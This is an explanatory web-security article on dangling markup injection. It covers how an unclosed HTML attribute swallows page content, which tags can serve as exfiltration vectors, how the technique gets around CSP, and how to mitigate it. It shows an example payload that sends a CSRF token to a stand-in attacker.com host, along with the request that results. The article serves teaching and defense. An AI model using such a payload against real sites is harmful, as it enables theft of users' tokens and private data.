How Dangling Markup Injection Steals Sensitive Data

Dangling markup injection is a client-side web security vulnerability that allows attackers to exfiltrate sensitive data from a webpage without executing JavaScript. When defenses such as Content Security Policy (CSP) or strict input sanitizers block traditional Cross-Site Scripting (XSS), an attacker can instead inject an unfinished HTML tag. The browser attempts to parse this incomplete markup, inadvertently absorbing surrounding page content—including CSRF tokens, private user information, and session data—into a resource-loading attribute that is subsequently transmitted to an attacker-controlled server.

The Core Mechanism

Traditional XSS relies on injecting and executing scripts (such as <script> tags or inline event handlers like onload). Dangling markup relies strictly on standard HTML parsing rules.

An attacker exploits an input field that reflects unencoded characters, specifically quote characters (" or ') and tag brackets (<). Instead of injecting a complete payload, the attacker injects an opened, unclosed HTML element that uses an external resource attribute, such as:

<img src='https://attacker.com/log?data=

Notice the single quote opening the src attribute is never closed within the injected string.

The "Dangling" Effect

When the browser parses the Document Object Model (DOM), it encounters the unfinished src attribute. To resolve the attribute value, the HTML parser keeps reading every subsequent character on the page until it encounters a matching closing quote (').

Consider a vulnerable page that displays sensitive data directly after an injection point:

<p>Welcome, User!</p>
<!-- Injection occurs here -->
<input type="hidden" name="csrf_token" value="s3cr3t_t0k3n_v4lu3" />

If the attacker injects <img src='https://attacker.com/log?data=, the rendered source becomes:

<p>Welcome, User!</p>
<img src='https://attacker.com/log?data=
<input type="hidden" name="csrf_token" value="s3cr3t_t0k3n_v4lu3" />

The browser treats everything between the first ' and the ' closing the value attribute as part of the URL. The browser constructs an HTTP request equivalent to:

GET /log?data=%0A<input%20type="hidden"%20name="csrf_token"%20value=s3cr3t_t0k3n_v4lu3 HTTP/1.1
Host: attacker.com

The secret token is delivered straight to the attacker's web server logs through the browser’s automatic attempt to fetch the image.

Vectors Used for Exfiltration

Any HTML tag that fetches external resources or redirects navigation via an attribute can be leveraged for dangling markup. Common vectors include:

  • Image tags (<img>): Triggers an immediate GET request via the src attribute.
  • Form elements (<form action="...">): Modifies where user-submitted data goes, capturing inputs upon form submission.
  • Base tags (<base href="...">): Hijacks all relative links and script requests on the page, redirecting subsequent resource loads or user clicks to an external domain.
  • Styling links (<link rel="stylesheet" href="...">): Fetches external stylesheets, exfiltrating all swallowed text as the URL target.

Bypassing Security Controls

Dangling markup is primarily used to bypass restrictive Content Security Policies. A site may enforce script-src 'none' or implement strict nonce checks to completely eliminate the possibility of JavaScript execution. However, if the policy loosely defines directives such as img-src * or fails to restrict default-src, the browser is still permitted to make outbound HTTP requests for non-script resources.

Mitigation Strategies

Protecting applications against dangling markup requires multiple layers of defense:

  1. Context-Aware Output Encoding: Ensure all dynamic inputs reflected into HTML are properly encoded. Converting < to &lt;, > to &gt;, " to &quot;, and ' to &#x27; prevents attackers from breaking out of context and opening new HTML tags.
  2. Comprehensive CSP Directives: Restrict destinations for resource loading. Explicitly define directives like img-src, connect-src, and style-src to trusted domains rather than wildcards. Set base-uri 'self' to prevent modification of relative URL handling.
  3. Modern Browser Protections: Current browser implementations (including Chrome and Firefox) actively mitigate basic dangling markup by preventing URLs inside attributes like src and href from spanning across raw newline characters or angle brackets. However, strict encoding remains the only universal defense.
